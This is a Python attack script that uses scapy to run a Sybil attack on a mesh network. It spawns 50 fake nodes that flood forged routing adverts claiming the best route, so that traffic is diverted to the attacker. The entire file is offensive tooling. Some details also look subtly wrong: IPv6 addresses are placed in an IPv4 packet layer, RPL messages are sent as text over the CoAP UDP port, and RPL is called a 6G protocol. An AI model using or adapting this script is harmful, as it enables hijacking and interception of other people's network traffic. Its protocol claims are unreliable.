import multiprocessing
import time
import random
from scapy.all import IP, UDP, send

# ==============================================================================
# CONFIGURATION
# ==============================================================================
TARGET_NETWORK = "2001:db8:mesh::"
ATTACK_DURATION = 10  # Seconds
FAKE_NODE_COUNT = 50

# ==============================================================================
# THE SYBIL NODE WORKER
# ==============================================================================
def advertise_fake_route(node_id):
    """
    Simulates a single fake 6G node broadcasting:
    'I AM THE FASTEST ROUTE TO THE INTERNET.'
    """
    # Create a random fake IPv6 address for this ghost node
    fake_ip = f"{TARGET_NETWORK}{random.randint(1000, 9999)}"
    
    # 6G Routing Protocol (RPL) Metric: 1 = Perfect connection
    # We lie and say we have metric 1 (Real nodes usually have 10-50)
    routing_payload = f"RPL:OP_CODE=DAO;RANK=1;PARENT={fake_ip}"
    
    # Create the packet
    pkt = IP(dst="ff02::1a", src=fake_ip) / UDP(dport=5683) / routing_payload
    
    while True:
        # Spam the network with lies
        send(pkt, verbose=0)
        time.sleep(random.uniform(0.1, 0.5))

# ==============================================================================
# EXECUTION
# ==============================================================================
if __name__ == "__main__":
    print(f"[*] Spawning {FAKE_NODE_COUNT} Sybil Nodes to poison routing table...")
    
    # We use multiprocessing to make it look like 50 distinct devices
    pool = []
    for i in range(FAKE_NODE_COUNT):
        p = multiprocessing.Process(target=advertise_fake_route, args=(i,))
        p.start()
        pool.append(p)
        
    print(f"[+] Swarm active. Target traffic should now be diverting to us.")
    time.sleep(ATTACK_DURATION)
    
    print("[*] Killing swarm...")
    for p in pool:
        p.terminate()